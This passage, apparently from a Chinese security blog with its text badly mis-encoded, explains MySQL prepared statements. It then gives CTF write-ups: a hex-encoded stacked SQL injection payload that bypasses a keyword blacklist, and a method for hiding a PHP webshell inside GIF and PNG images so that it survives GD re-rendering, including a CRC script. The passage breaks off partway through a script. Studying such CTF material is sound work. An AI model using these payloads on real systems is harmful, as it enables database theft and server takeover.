å¾€å¾€è¿˜æ˜¯éœ€è¦é€šè¿‡å…·ä½“å€¼æ¥é¢„ä¼°å‡ºæˆæœ¬ä»£ä»·ã€‚ 0x04 Prepared SQL Statement Syntax MySQL å®˜æ–¹å°† prepareã€executeã€deallocate ç»Ÿç§°ä¸º PREPARE STATEMENTã€‚ç¿»è¯‘ä¹Ÿå°±ä¹ æƒ¯çš„ç§°å…¶ä¸ºé¢„å¤„ç†è¯­å¥ã€‚ MySQL é¢„å¤„ç†è¯­å¥çš„æ”¯æŒç‰ˆæœ¬è¾ƒæ—©ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›®å‰æ™®éä½¿ç”¨çš„ MySQL ç‰ˆæœ¬éƒ½æ˜¯æ”¯æŒè¿™ä¸€è¯­æ³•çš„ã€‚ è¯­æ³•ï¼š # å®šä¹‰é¢„å¤„ç†è¯­å¥ PREPARE stmt_name FROM preparable_stmt; # æ‰§è¡Œé¢„å¤„ç†è¯­å¥ EXECUTE stmt_name [USING @var_name [, @var_name] ...]; # åˆ é™¤(é‡Šæ”¾)å®šä¹‰ {DEALLOCATE | DROP} PREPARE stmt_name; 4.1 åˆ©ç”¨å­—ç¬¦ä¸²å®šä¹‰é¢„å¤„ç† SQL (ç›´è§’ä¸‰è§’å½¢è®¡ç®—) mysql&gt; PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse'; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; SET @a = 3; Query OK, 0 rows affected (0.00 sec) mysql&gt; set @b = 4; Query OK, 0 rows affected (0.00 sec) mysql&gt; execute stmt1 using @a, @b; +------------+ | hypotenuse | +------------+ | 5 | +------------+ 1 row in set (0.00 sec) 4.2 åˆ©ç”¨å˜é‡å®šä¹‰é¢„å¤„ç† SQL (ç›´è§’ä¸‰è§’å½¢è®¡ç®—) mysql&gt; set @s = 'select sqrt(pow(?,2) + pow(?,2)) as hypotenuse'; Query OK, 0 rows affected (0.00 sec) mysql&gt; prepare stmt2 from @s; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; set @c = 6; Query OK, 0 rows affected (0.00 sec) mysql&gt; set @d = 8; Query OK, 0 rows affected (0.00 sec) mysql&gt; execute stmt2 using @c, @d; +------------+ | hypotenuse | +------------+ | 10 | +------------+ 1 row in set (0.00 sec) 4.3 è§£å†³æ— æ³•ä¼ å‚é—®é¢˜ æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äº LIMIT å­å¥ä¸­çš„å€¼ï¼Œå¿…é¡»æ˜¯å¸¸é‡ï¼Œä¸å¾—ä½¿ç”¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ä½¿ç”¨ï¼šSELECT * FROM TABLE LIMIT @skip, @numrows; ä½†æ˜¯ï¼Œå¯ä»¥ç”¨ PREPARE è¯­å¥è§£å†³æ­¤é—®é¢˜ã€‚ mysql&gt; SET @skip = 100; SET @numrows = 3; Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec) mysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1 mysql&gt; PREPARE stmt3 FROM \"SELECT * FROM t1 LIMIT ?, ?\"; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; EXECUTE stmt3 USING @skip, @numrows; +-----+--------+ | a | filler | +-----+--------+ | 100 | filler | | 101 | filler | | 102 | filler | +-----+--------+ 3 rows in set (0.00 sec) mysql&gt; DEALLOCATE PREPARE stmt3; Query OK, 0 rows affected (0.00 sec) â€‹ å¦‚æ­¤ä¸€æ¥ï¼Œç»“åˆ2ä¸­ä»‹ç»çš„åˆ©ç”¨å˜é‡å®šä¹‰é¢„å¤„ç† SQL ä¹Ÿå°±åŸºæœ¬è§£å†³äº†ä¼ å‚æ—¶è¯­æ³•æŠ¥é”™é—®é¢˜äº†ï¼Œç±»ä¼¼çš„ï¼šç”¨å˜é‡ä¼ å‚åšè¡¨åæ—¶ï¼Œ MySQL ä¼šæŠŠå˜é‡åå½“åšè¡¨åï¼Œè¿™æ ·æ—¢ä¸æ˜¯æœ¬æ„ï¼Œä¹Ÿä¸æ˜¯è¯­æ³•é”™è¯¯ï¼Œåœ¨ SQL Server çš„è§£å†³åŠæ³•æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç©¿æ’å˜é‡è¿›è¡Œä¼ å‚ï¼Œå†å°† æ•´æ¡ SQL è¯­å¥ä½œä¸ºå˜é‡ï¼Œæœ€åæ˜¯ç”¨ sp_executesql è°ƒç”¨è¯¥æ‹¼æ¥ SQL æ‰§è¡Œï¼Œè€Œ Prepared SQL Statement å¯è°“å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚ mysql&gt; SET @table = 't2'; Query OK, 0 rows affected (0.00 sec) mysql&gt; SET @s = CONCAT('SELECT * FROM ', @table);#å­—ç¬¦ä¸²æ‹¼æ¥ Query OK, 0 rows affected (0.00 sec) mysql&gt; PREPARE stmt4 FROM @s; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; EXECUTE stmt4; +------+-------+-------+ | id | score | grade | +------+-------+-------+ | 1 | 99 | A | | 2 | 81 | B | | 3 | 55 | D | | 4 | 69 | C | +------+-------+-------+ 4 rows in set (0.00 sec) mysql&gt; DROP PREPARE stmt4; Query OK, 0 rows affected (0.00 sec) 0x05 é¢„å¤„ç† SQL æ³¨æ„ç‚¹ 1ã€stmt_name ä½œä¸º preparable_stmt çš„æ¥æ”¶è€…ï¼Œå”¯ä¸€æ ‡è¯†ï¼Œä¸åŒºåˆ†å¤§å°å†™ã€‚ 2ã€preparable_stmt è¯­å¥ä¸­çš„ ? æ˜¯ä¸ªå ä½ç¬¦ï¼Œæ‰€ä»£è¡¨çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸éœ€è¦å°† ? ç”¨å¼•å·åŒ…å«èµ·æ¥ã€‚ 3ã€å®šä¹‰ä¸€ä¸ªå·²å­˜åœ¨çš„ stmt_name ï¼ŒåŸæœ‰çš„å°†è¢«ç«‹å³é‡Šæ”¾ï¼Œç±»ä¼¼äºå˜é‡çš„é‡æ–°èµ‹å€¼ã€‚ 4ã€PREPARE stmt_name çš„ä½œç”¨åŸŸæ˜¯sessionçº§ å¯ä»¥é€šè¿‡ max_prepared_stmt_count å˜é‡æ¥æ§åˆ¶å…¨å±€æœ€å¤§çš„å­˜å‚¨çš„é¢„å¤„ç†è¯­å¥ã€‚ mysql&gt; show variables like \"max_prepared%\"; ERROR 2006 (HY000): MySQL server has gone away No connection. Trying to reconnect... Connection id: 4 Current database: *** NONE *** +-------------------------+-------+ | Variable_name | Value | +-------------------------+-------+ | max_prepared_stmt_count | 16382 | +-------------------------+-------+ 1 row in set, 3 warnings (0.01 sec) é¢„å¤„ç†ç¼–è¯‘ SQL æ˜¯å ç”¨èµ„æºçš„ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨åæ³¨æ„åŠæ—¶ä½¿ç”¨ DEALLOCATE PREPARE é‡Šæ”¾èµ„æºï¼Œè¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ 0x06 å®æˆ˜ä½“æ‚Ÿ åœ¨è¿™é‡Œæ ¹æ®ä¸Šè¿°å­¦çš„æ¥é‡æ–°åšä¸€ä¸‹é‚£é“CTFé¢˜ç›®ï¼ŒåŠ æ·±å°è±¡ã€‚ from flask import Flask, render_template, request import MySQLdb import re blacklist = ['select', 'update', 'insert', 'delete', 'database', 'table', 'column', 'alter', 'create', 'drop', 'and', 'or', 'xor', 'if', 'else', 'then', 'where'] conn = MySQLdb.connect(host='db', port=3306, user='root', passwd='root', db='ctf') app = Flask(__name__) @app.route('/') def index(): field = request.args.get('order', 'id') field = re.sub(r'\\s+', '', field) for s in blacklist: if s.lower() in field.lower(): return s + ' are banned' if not re.match(r\"id|name|email\", field): field = 'id' with conn.cursor() as cursor: cursor.execute('SELECT * FROM userinfo order by %s' % field) res = cursor.fetchall() return render_template('index.html', res=res) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) è¿™é‡Œçœ‹ä¸Šè¿°æºç å‘ç°ï¼Œé»‘åå•è¿‡æ»¤å¾ˆå…¨ï¼Œå¹¶ä¸”sqlmapä¹Ÿè·‘ä¸å‡ºæ¥ã€‚éšåé™·å…¥åªæ˜¯ç›²åŒºï¼Œçœ‹äº†hintå‘ç°cursor.executeå¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œç”±æ­¤å¯ä»¥å‘ç°è¿™é‡Œæœ‰å †å æ³¨å…¥çš„å¯èƒ½ï¼ˆé¢˜ååæ€ï¼šè¿™é‡Œå‘¢æç¤ºæˆ‘åœ¨æ—¥ååˆ†æä»£ç çš„æ—¶å€™ï¼Œå­¦ä¼šå»æ‰¾æ•æ„Ÿå‡½æ•°ï¼Œæœå¯»ä¸€ä¸‹å„ç±»å‡½æ•°çš„ç”¨æ³•ï¼Œè¯´ä¸å®šå°±æ‰¾åˆ°æ¼æ´ç‚¹äº†ï¼‰ã€‚ é‚£æˆ‘ä»¬ç›´æ¥æ„é€ ä¸€æ³¢prepareè¯­å¥ï¼Œæ—¢ç„¶æ˜¯é¢„å¤„ç†äº†ï¼Œé‚£å®Œå…¨æ²¡å¿…è¦æ‹…å¿ƒé»‘åå•è¿™ä¸ªç‚¹äº†ã€‚è¿™é‡Œå‘¢wpæ˜¯é‡‡ç”¨çš„å˜é‡å®šä¹‰é¢„å¤„ç†SQL //æŠ¥é”™æ³¨å…¥è¯­å¥,è¿™é‡Œæ³¨æ„æŠ¥é”™å›æ˜¾æ•°æ®æ˜¯æœ‰é™çš„ select updatexml(1, concat(0x7e, substr((select flag from flag), 1, 31), 0x7e), 1); //æ¥ç€æ„é€ é¢„å¤„ç†SQL id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783 765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; è¿™é‡Œå‘¢éœ€è¦è¿›è¡Œhexç¼–ç çš„åŸå› æ˜¯ç»•è¿‡é»‘åå•ï¼Œç”±äºä½ è¿™ä¸ªé¢„å¤„ç†SQLç›´æ¥æ˜¯ä¸MySQLæ•°æ®åº“äº¤äº’ï¼Œè€ŒMySQLæ˜¯ä¼šè‡ªåŠ¨è§£æ16è¿›åˆ¶å¹¶å»è§£ç çš„ï¼Œæ•…æ­¤è¿™é‡Œhexç¼–ç æ˜¯å¿…è¦çš„ã€‚å…¶æ¬¡ä½¿ç”¨å†…è”æ³¨é‡Šç¬¦/**/çš„åŸå› æ˜¯re.subè¿™é‡Œçš„å‡½æ•°ä¼šè¿‡æ»¤æ‰æˆ‘ä»¬è¾“å…¥çš„ç©ºæ ¼å­—ç¬¦ï¼Œå› æ­¤æ³¨é‡Šç¬¦ä¹Ÿæ˜¯å¿…è¦çš„ã€‚ è¿™é‡Œæ˜¯setä¸€ä¸ªå˜é‡ï¼Œå¹¶èµ‹å€¼ä¸ºæ¶æ„ä»£ç ï¼Œéšåprepareå®šä¹‰é¢„å¤„ç†è¯­å¥ï¼Œæ¥ç€executeæ‰§è¡Œé¢„å¤„ç†è¯­å¥ã€‚ å›æ˜¾flag 0x07 å‚è€ƒæ–‡ç«  MySQLå¦‚ä½•å¯¹SQLåšprepareé¢„å¤„ç†ï¼ˆè§£å†³INæŸ¥è¯¢SQLé¢„å¤„ç†ä»…èƒ½æŸ¥è¯¢å‡ºä¸€æ¡è®°å½•çš„é—®é¢˜ï¼‰ MySQLçš„SQLé¢„å¤„ç†(Prepared) [0xGameCTF 2023] webé¢˜è§£","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æ·±åº¦å­¦ä¹ æ–‡ä»¶ä¸Šä¼ -äºŒæ¬¡æ¸²æŸ“","path":"/2023/10/26/qian-xi-er-ci-xuan-ran/","content":"0x01 å‰è¨€ è¿™ç¯‡æ–‡ç« æ˜¯åœ¨åšCTFæ–°ç”Ÿèµ›æ‰€é‡åˆ°çš„ï¼Œä¹‹å‰è™½ç„¶åšé¶åœºçš„æ—¶å€™åšä¸ªäºŒæ¬¡æ¸²æŸ“ï¼Œä½†ä»æ­¤æ¬¡åšé¢˜æ•ˆæœæ¥çœ‹ï¼Œæ²¡å•¥åµç”¨ï¼ˆä¹‹å‰ä¹Ÿæ²¡å¥½å¥½å­¦ï¼Œåªæ˜¯ç®€å•äº†è§£è€Œå·²ï¼‰è¿™æ¬¡å€Ÿç€é¶åœºç¯å¢ƒè¿˜åœ¨ï¼Œèµ¶ç´§å­¦ä¹ ä¸€æ³¢çŸ¥è¯†ï¼ï¼ï¼ 0x02 äºŒæ¬¡æ¸²æŸ“ é¢˜ç›®æºç å¦‚ä¸‹ï¼š &lt;?php error_reporting(0); session_start(); $user_dir = 'uploads/'.md5($_SERVER['REMOTE_ADDR']).'/'; if (!file_exists($user_dir)) { mkdir($user_dir); } switch ($_FILES['file']['type']) { case \"image/gif\": $source = imagecreatefromgif($_FILES['file']['tmp_name']); break; case \"image/jpeg\": $source = imagecreatefromjpeg($_FILES['file']['tmp_name']); break; case \"image/png\": $source = imagecreatefrompng($_FILES['file']['tmp_name']); break; default: die('Invalid file type!'); } $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filepath = $user_dir.md5($_FILES['file']['name']).'.'.$ext; switch ($_FILES['file']['type']) { case \"image/gif\": imagegif($source, $filepath); break; case \"image/jpeg\": imagejpeg($source, $filepath); break; case \"image/png\": imagepng($source, $filepath); break; default: die('Invalid file type!'); } echo 'Upload avatar success! Path: '.$filepath; $_SESSION['avatar'] = $filepath; ?&gt; äº†è§£ä¸€æ³¢å…³é”®å‡½æ•°ï¼š imagecreatefromgif()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromjpeg()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» JPEG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefrompng()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» PNG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromwbmp()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» WBMP æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromstring()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»å­—ç¬¦ä¸²ä¸­çš„å›¾åƒæµæ–°å»ºä¸€å‰¯å›¾åƒ imagecreatefromjpegäºŒæ¬¡æ¸²æŸ“å®ƒç›¸å½“äºæ˜¯æŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­éå›¾ åƒæ•°æ®çš„éƒ¨åˆ†ç›´æ¥å°±éš”ç¦»å¼€äº†ï¼Œè¿™æ—¶å€™å¾—å»æ‰¾å›¾ç‰‡ç»è¿‡GDåº“è½¬åŒ–åæ²¡æœ‰æ”¹å˜çš„éƒ¨åˆ†ï¼Œå†å°†æœªæ”¹å˜çš„éƒ¨åˆ†ä¿®æ”¹ä¸ºç›¸åº”çš„phpä»£ç ã€‚ è€Œå…¶ä½™çš„åƒpngï¼Œgifçš„å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼ã€‚ æˆ‘ä»¬æ¥ä¸‹æ¥å…ˆä»æœ€å®¹æ˜“åˆ©ç”¨çš„å›¾åƒå¼€å§‹ï¼š 2.1 åˆ©ç”¨GIF å¦‚å›¾æˆ‘ä»¬ç°åœ¨gitå›¾åƒåé¢æ·»åŠ ä¸€å¥è¯æœ¨é©¬ä¸Šä¼  æ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®è¯¥è¿æ¥å»ä¸‹è½½å›¾ç‰‡ï¼Œçœ‹çœ‹ä¸Šä¼ å‰åå›¾ç‰‡çš„å˜åŒ– å¯ä»¥çœ‹åˆ°æ­¤æ—¶æˆ‘ä»¬çš„æœ¨é©¬æ²¡äº†ã€‚ã€‚ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€çœ‹çœ‹å“ªäº›åŒºåŸŸæ²¡æœ‰å‘ç”Ÿå˜åŒ– è¿™é‡Œè¿™ä¸ªç¼–è¾‘å™¨ä¹Ÿæ²¡å’‹ç”¨è¿‡ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºè¿™é‡Œçš„åŒ¹é…æŒ‡çš„å°±æ˜¯Aå’ŒBå›¾ç‰‡ç›¸åŒçš„åœ°æ–¹ï¼Œé‚£æˆ‘ä»¬ç›´æ¥åœ¨æ­¤å¤„æ·»åŠ ä¸€å¥è¯æœ¨é©¬çœ‹çœ‹ å¦‚ä¸‹å›¾åœ¨æ­¤ä¸Šä¼ æˆåŠŸ è¿™é‡Œä¹Ÿæ˜¯æé”™äº†ï¼Œå¿˜è®°ä¸Šä¼ çš„æ—¶å€™éœ€è¦ä¿®æ”¹åç¼€äº†ï¼ˆä¸ç„¶æœåŠ¡å™¨å¦‚ä½•å°†å…¶å½“åšphpæ–‡ä»¶è§£æå‘¢ï¼Ÿï¼‰ä¸Šä¼ æˆåŠŸåæˆ‘ä»¬è®¿é—®æ–‡ä»¶è·¯å¾„ å¦‚ä¸‹å›¾æˆåŠŸä¸Šä¼ ï¼Œä¸è¿‡è¿™é‡Œä¼¼ä¹æ˜¯æœ‰å‘çš„ï¼Œåœ¨æ­¤ä¹‹å‰ä¸Šä¼ äº†å‡ ä¸ªgifï¼Œå‘ç°ä¼¼ä¹ä¿®æ”¹çš„åœ°æ–¹ä¸æ°å½“ï¼Œæœ€ç»ˆæœåŠ¡å™¨åœ¨è§£æå…¶ä¸ºphpæ—¶ä¼šè§£æé”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°æå‡ æ¬¡ã€‚ è¿™é‡Œä¹Ÿæ²¡ç»†ç©¶åŸç†ï¼Œä¸€èˆ¬é‡åˆ°è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼Œå¦‚æœé€‰æ‹©ä¸Šä¼ gifçš„è¯åªéœ€è¦æ¯”è¾ƒä¸Šä¼ å‰åå›¾ç‰‡æœªå‘ç”Ÿå˜åŒ–çš„åœ°æ–¹ï¼Œæ·»åŠ ä¸€å¥è¯æœ¨é©¬å³å¯ã€‚ 2.2 ä¸Šä¼ PNG pngçš„äºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡å¹¶ä¸èƒ½åƒgifé‚£æ ·ç®€å• 2.2.1 pngæ–‡ä»¶ç»„æˆ pngå›¾ç‰‡ç”±3ä¸ªä»¥ä¸Šçš„æ•°æ®å—ç»„æˆ. PNGå®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼Œä¸€ç§æ˜¯ç§°ä¸ºå…³é”®æ•°æ®å—(critical chunk)ï¼Œè¿™æ˜¯æ ‡å‡†çš„æ•°æ®å—ï¼Œå¦ä¸€ç§å«åšè¾…åŠ©æ•°æ®å—(ancillary chunks)ï¼Œè¿™æ˜¯å¯é€‰çš„æ•°æ®å—ã€‚å…³é”®æ•°æ®å—å®šä¹‰äº†3ä¸ªæ ‡å‡†æ•°æ®å—(IHDR,IDAT, IEND)ï¼Œæ¯ä¸ªPNGæ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬. æ•°æ®å—ç»“æ„ CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ã€‚CRCå…·ä½“ç®—æ³•å®šä¹‰åœ¨ISO 3309å’ŒITU-T V.42ä¸­ï¼Œå…¶å€¼æŒ‰ä¸‹é¢çš„CRCç ç”Ÿæˆå¤šé¡¹å¼è¿›è¡Œè®¡ç®—ï¼š x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1 //å’±ä¹Ÿçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ã€‚ 2.2.2 åˆ†ææ•°æ®å— IHDR æ•°æ®å—IHDR(header chunk)ï¼šå®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚ æ–‡ä»¶å¤´æ•°æ®å—ç”±13å­—èŠ‚ç»„æˆï¼Œå®ƒçš„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ PLTE è°ƒè‰²æ¿PLTEæ•°æ®å—æ˜¯è¾…åŠ©æ•°æ®å—,å¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4=16ï¼‰ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚ IDAT å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚ IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ï¼Œå› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿäº†è§£IDATçš„ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”ŸæˆPNGå›¾åƒ IEND å›¾åƒç»“æŸæ•°æ®IEND(image trailer chunk)ï¼šå®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚ å¦‚æœæˆ‘ä»¬ä»”ç»†è§‚å¯ŸPNGæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæ–‡ä»¶çš„ç»“å°¾12ä¸ªå­—ç¬¦çœ‹èµ·æ¥æ€»åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š 00 00 00 00 49 45 4E 44 AE 42 60 82 2.2.3 å†™å…¥phpä»£ç  åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ç§æ–¹å¼æ¥åˆ¶ä½œç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„pngæœ¨é©¬ å†™å…¥PLTEæ•°æ®å— phpåº•å±‚åœ¨å¯¹PLTEæ•°æ®å—éªŒè¯çš„æ—¶å€™,ä¸»è¦è¿›è¡Œäº†CRCæ ¡éªŒ.æ‰€ä»¥å¯ä»¥åœ¨chunk dataåŸŸæ’å…¥phpä»£ç ,ç„¶åé‡æ–°è®¡ç®—ç›¸åº”çš„crcå€¼å¹¶ä¿®æ”¹å³å¯. è¿™ç§æ–¹å¼åªé’ˆå¯¹ç´¢å¼•å½©è‰²å›¾åƒçš„pngå›¾ç‰‡æ‰æœ‰æ•ˆ,åœ¨é€‰å–pngå›¾ç‰‡æ—¶å¯æ ¹æ®IHDRæ•°æ®å—çš„color typeè¾¨åˆ«.03ä¸ºç´¢å¼•å½©è‰²å›¾åƒ. åœ¨PLTEæ•°æ®å—å†™å…¥phpä»£ç â€“è¿™é‡Œå€Ÿç”¨å¸ˆå‚…çš„å›¾ç‰‡äº† æ·±æœ‰æ„Ÿæ‚Ÿï¼Œæ‰¾äº†å‡ å¼ pngå›¾ç‰‡å‘ç°éƒ½æ²¡æœ‰PLTEæ•°æ®å—ï¼Œä¹Ÿä¸æƒ³æ‰¾äº†ã€‚ã€‚ã€‚ã€‚ è®¡ç®—PLTEæ•°æ®å—çš„CRCï¼Œè„šæœ¬å¦‚ä¸‹ import binascii import re png = open(r'2.png','rb') a = png.read() png.close() #é€šè¿‡ binascii.b2a_hex(a) å°†æ–‡ä»¶å†…å®¹ a è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ hexstr å˜é‡ä¸­ã€‚ hexstr = binascii.b2a_hex(a) #ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ re.findall ä» hexstr ä¸­æŸ¥æ‰¾ \"504c5445\"ï¼ˆå³ PLTE æ ‡è¯†ï¼‰å’Œ \"49444154\"ï¼ˆå³ IDAT æ ‡è¯†ï¼‰ä¹‹é—´çš„å†…å®¹ã€‚ ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] #å®ƒä½¿ç”¨ binascii.crc32 å‡½æ•°å¯¹ data[:-16] è¿›è¡Œ CRC32 æ ¡éªŒå’Œè®¡ç®—ã€‚ crc = binascii.crc32(data[:-16].decode('hex')) &amp; 0xffffffff print hex(crc) ä¿®æ”¹CRCå€¼ éªŒè¯ï¼Œå°†ä¿®æ”¹åçš„pngå›¾ç‰‡ä¸Šä¼ å,ä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€ å†™å…¥IDATæ•°æ®å— è¿™é‡Œæœ‰å›½å¤–å¤§ç‰›å†™çš„è„šæœ¬,ç›´æ¥æ‹¿æ¥è¿è¡Œå³å¯. &lt;?php //åˆ›å»ºä¸€ä¸ªåä¸º $p çš„æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ç³»åˆ—åå…­è¿›åˆ¶é¢œè‰²å€¼ã€‚è¿™äº›é¢œè‰²å€¼æŒ‰ç…§ RGB é¡ºåºæ’åˆ—ï¼Œæ¯ä¸‰ä¸ªå…ƒç´ ä»£è¡¨ä¸€ä¸ªåƒç´ çš„é¢œè‰²ã€‚ $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); //ä½¿ç”¨ imagecreatetruecolor å‡½æ•°åˆ›å»ºä¸€ä¸ª 32x32 åƒç´ çš„çœŸå½©è‰²å›¾åƒå¯¹è±¡ï¼Œå¹¶å°†å…¶åˆ†é…ç»™ $img å˜é‡ã€‚ $img = imagecreatetruecolor(32, 32); //ä½¿ç”¨ for å¾ªç¯éå†æ•°ç»„ $pï¼Œæ¯æ¬¡è¿­ä»£å¤„ç†ä¸‰ä¸ªæ•°ç»„å…ƒç´ ï¼Œå³ä¸€ä¸ªåƒç´ çš„ RGB å€¼ã€‚ for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; //æ¯æ¬¡è¿­ä»£ä¸­ï¼Œä»æ•°ç»„ä¸­æå–çº¢è‰²ï¼ˆRï¼‰ã€ç»¿è‰²ï¼ˆGï¼‰ã€å’Œè“è‰²ï¼ˆBï¼‰çš„é¢œè‰²å€¼ï¼Œå¹¶ä½¿ç”¨ imagecolorallocate å‡½æ•°åˆ›å»ºä¸€ä¸ªé¢œè‰²æ ‡è¯†ç¬¦ã€‚ $color = imagecolorallocate($img, $r, $g, $b); //ä½¿ç”¨ imagesetpixel å‡½æ•°åœ¨å›¾åƒçš„ç¬¬ä¸€è¡Œï¼ˆ$y / 3 ä¸ºåƒç´ çš„æ¨ªåæ ‡ï¼Œ0 ä¸ºçºµåæ ‡ï¼‰è®¾ç½®åƒç´ é¢œè‰²ã€‚ imagesetpixel($img, round($y / 3), 0, $color); } //ä½¿ç”¨ imagepng 